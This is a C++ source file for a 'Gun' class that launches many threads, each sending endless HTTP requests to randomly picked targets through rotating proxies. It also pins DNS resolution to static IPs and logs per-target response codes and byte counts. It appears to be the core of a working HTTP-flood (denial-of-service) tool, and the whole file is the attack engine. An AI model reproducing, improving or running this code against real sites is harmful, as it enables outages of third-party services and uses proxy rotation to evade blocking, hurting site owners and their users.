#include "gun.h"


Gun::Gun(Jobs *jobs, Proxy *prx, Stats *stat)
{
    this->jobs = jobs;
    this->prx  = prx;
    this->stat = stat;

    this->watcherTh = new std::thread(&Gun::watcher,this);
}




void Gun::reload(Jobs * jobs) {
    this->jobs = jobs;
}

void Gun::watcher() {
    size_t i = 1; // init load in main.cpp
    while (true) {
        if (i % 10 == 0) {
            prx->load(""); // load last succesed
        }

        if ((i % 60) == 0) {
            jobs->load();
        }
        i++;
        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
}


void Gun::fire() {
    threads.clear();
    thState.clear();
    for (int i = 0;i < threadsCount; i++) {
        auto th = new std::thread(&Gun::httpGet,this,i);
        threads.push_back(th);
    }
    startTime = time(nullptr);

}

size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    return size * nmemb;
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void Gun::httpGet(uint thId) {
    CURL* curl;
    curl = curl_easy_init();
    if (curl) {
        CURLcode res;
        std::string readBuffer;
        struct curl_slist *hostResolve = nullptr;
        //set job
        auto job = jobs->getRand();
        thState[thId].state = "Start";
        thState[thId].target = job->getTarget();
        curl_easy_setopt(curl, CURLOPT_URL, job->path.c_str());
        //--set job
        // set proxy
        std::string randPrx = prx->getRand();
        if (randPrx != "") {
            thState[thId].proxy = randPrx;
            curl_easy_setopt(curl, CURLOPT_PROXY, randPrx.c_str());
        }
        //--set proxy
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);


        uint i = 0;
        while (true) {
            thState[thId].state = "req";
            thState[thId].count++;

            if (i == 0  or (i % this->reqPerProxy) == 0) { // proxy set
                randPrx = prx->getRand();
                if (randPrx != "") {
                    thState[thId].proxy = randPrx;
                    curl_easy_setopt(curl, CURLOPT_PROXY, randPrx.c_str());
                }
            }

            if ((i % this->reqPerJob) == 0) { // job set
                job = jobs->getRand();
                thState[thId].target = job->getTarget();
                curl_easy_setopt(curl, CURLOPT_URL, job->path.c_str());
                if (job->staticHost != "") {
                    std::string s;
                    std::string ip   = job->staticHost.substr (0,job->staticHost.find(":")-1);
                    std::string port = job->staticHost.substr (job->staticHost.find(":")+1);
                    s = job->getHost() + ":" + port + ":" + ip;
                    //std::cout << s << std::endl;
                    if (hostResolve != nullptr) {
                        curl_slist_free_all(hostResolve);
                    }
                    hostResolve = curl_slist_append(NULL,s.c_str());
                    curl_easy_setopt(curl, CURLOPT_RESOLVE, hostResolve);

                }
            }


            res = curl_easy_perform(curl);
            long http_code = 0;
            double up = 0;
            double down = 0;
            curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
            curl_easy_getinfo (curl, CURLINFO_SIZE_UPLOAD, &up);
            curl_easy_getinfo (curl, CURLINFO_SIZE_DOWNLOAD, &down);


//            if (http_code == 200 && res != CURLE_ABORTED_BY_CALLBACK) {
//                     //Succeeded
//            }
            //std::cout << "http:" << http_code << " curl:"<< res <<" :"<< curl_easy_strerror(res) << "  " << job->path << std::endl;

            thState[thId].curlCode = res;
            thState[thId].httpCode = http_code;

            this->stat->push(job->getTarget(),randPrx,res,http_code);
            this->stat->pushBytes(job->getTarget(),randPrx,down,up);
            i++;

        }
        thState[thId].state = "finished";
        /* always cleanup */
        curl_easy_cleanup(curl);


    }
}
